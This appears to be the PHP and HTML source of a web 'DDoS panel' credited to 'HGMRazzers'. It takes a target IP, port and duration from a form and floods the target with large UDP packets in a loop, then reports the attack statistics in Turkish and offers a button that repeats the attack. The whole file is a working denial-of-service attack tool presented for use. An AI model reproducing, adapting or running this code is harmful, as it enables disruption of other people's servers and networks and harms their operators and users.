<style>
body {
	font-family: calibri,tahoma,verdana,terminal,serif,lucida,system;
	font-size: 12px;
	font-style: normal;
	line-height: normal;
	color: #7CFC00;
	background-color: #000000;
}

.HGMRazzers_Buton {
width: 240px;
border: solid 2px #00BCFF;
background-color: #000000;
padding: 3px;
cursor: pointer }

input:hover , input:active { border-color: #FF0000 }

</style>
<center><br><br>
<img src="HGMRbackground.PNG"><br>
<?php

//=================================================
//Coded by HGMRazzers By HGM
//=================================================

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "V53B75as1RraCGgEXVwz57eswc7s441z83WREXSB3Q5gcEB7CzswBqa2bvzS2b7SxQ9bf80sG9g86x42CgFDFXBREFvqzWGazwxCTz6QQDGR8r0bg38weGt4BD6g3ra2SfX2drFec9aVFCAsev3b64SRXf0WBxd1Zt78qDfaev58ASRg9R8XEXTQd9Zcc852gB6s7r8cGXd82tVVdvZadZ549qW9WfZd3SRVCfvFxGTRcAc3TET3A7G8FFBGvbtr2T9D4CsEBr248bAav5g5Fc38sdXesSVR2csrtdeQf0g5c896SADXBBwEGzasASfVc5x7R51v42EGfQX4R2VTFa0v8tCSda4wttTZg30BbxTT7v5b6DrF2W6WtDg495g5B0Ec2Bf3S9vQezf8frrqeDCXTxs3d2VERf0vD3r6DQDc8xc5WWSe00rge3Wb9wTrwDw1Ctv4Arq8Q4Vvrctbwwgc9WgQvG1DSRSwvWsvXq61qFtCG51wwb5QGWfd5QWB71rRAER8fGDE45rbG5gZVs888tDBxx16WSdCGA6z8ctfXW8zggzG0AWCQdgsa3xRS4X0TTZ5A1bqF2CaVZ74tQSz3G9qsfVdSG6VggFAaerB4AqWRt7E1WSCQfVQVBGzD72g8cWC8Z2SBEgCsRxfXgXztw17qZr73EZFVHGMqtVvdRwwQ67tDXWb8ddT6BAXrBZbqg83sd4c73c17QEVFsqx989Z5We4A58w3DGZfX7GSS9Zv7c27dA4fAgTzAs6";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "<b><font size=3>|-------------------------------------------------------------------------|</font></b>";
echo "<b><font size=3><br>Tamamlanan</font><font color=red><font size=3> Saldiri</font><font color=#7CFC00><font size=3> Bilgileri;</font></b><br>";
echo "<b><font size=3>|-------------------------------------------------------------------------|</font></b>";
echo "<b><font size=2><br>Saldirilan Ip:<font color=red> $ip</font></b><br>";
echo "<b><font size=2>Saldirilan Port:<font color=red> $rand </font></b><br>";
echo "<b><font size=2>Saldiri Suresi:<font color=red> $exec_time </font><font color=red>Saniye</font></b><br>";
echo "<b><font size=2>Paket Bilgisi:<font color=red> $packets Paket </font></b><br>";
echo "<b><font size=2>Paket Boyutu:<font color=red> (" . round(($packets*65)/1024, 2) . " Mb)</font></b><br>";
echo "<b><font size=2>Paketlerin Ortalamasi:<font color=red> ". round($packets/$exec_time, 2) . " Paket // Saniye \n </font></b><br>";
echo "<b><font size=3>|-------------------------------------------------------------------------|</font></b>";
?>
<br><br>
<input type="button" value="Saldiriyi Tekrarla -->" class="HGMRazzers_Buton" style="color:red" onclick="parent.window.location.reload();" /> <br><br></td>
<input type="button" value="<-- Geri Donme" class="HGMRazzers_Buton" style="color:#7CFC00" onclick="window.location.href='/HGMRazzers/HGMRazzers-DDoS-Panel.php'" /> </td>